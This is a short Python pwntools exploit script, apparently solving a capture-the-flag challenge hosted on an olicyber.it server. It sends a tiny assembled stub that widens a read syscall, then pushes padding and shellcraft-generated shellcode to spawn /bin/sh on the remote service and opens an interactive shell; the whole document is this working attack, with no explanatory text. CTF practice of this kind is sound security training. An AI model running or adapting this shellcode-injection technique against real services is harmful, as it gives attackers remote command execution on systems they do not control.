from pwn import *

context.update(arch='amd64', os='linux', endian='little')

SYSCALL_READ = """
mov dl, 0xff
syscall
"""
syscall_read = asm(SYSCALL_READ)
shellcode = asm(shellcraft.amd64.linux.sh())

r = remote("readdle.challs.olicyber.it", 10018)

r.recvline()
r.send(syscall_read)
r.recvline()

r.sendline(b"A"*4 + shellcode)
r.interactive()